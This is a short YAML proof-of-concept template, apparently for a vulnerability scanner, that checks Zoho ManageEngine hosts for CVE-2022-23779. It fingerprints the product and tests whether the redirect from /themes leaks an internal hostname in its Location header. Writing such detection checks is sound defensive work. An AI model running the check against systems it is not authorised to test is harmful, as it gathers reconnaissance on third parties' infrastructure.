name: poc-yaml-zoho-cve-2022-23779-info-leak
manual: true
transport: http
rules:
    detect:
        request:
            method: GET
            path: /configurations
            follow_redirects: false
        expression: response.status == 200 && "http(s)?://www\\.manageengine\\.com/.*\\.html\\?".bmatches(response.body) && response.body.bcontains(b"ZOHO Corp.")
    r0:
        request:
            cache: true
            method: GET
            path: /themes
            follow_redirects: false
        expression: response.status == 301 && "^http(s)?:\\/\\/.*\\/themes\\/$".bmatches(bytes(response.headers["Location"])) && !response.headers["Location"].contains(response.url.host)
expression: detect() && r0()
detail:
    author: For3stCo1d (https://github.com/For3stCo1d)
    links:
        - https://github.com/fbusr/CVE-2022-23779
    vulnerability:
        id: CT-394808
        level: medium
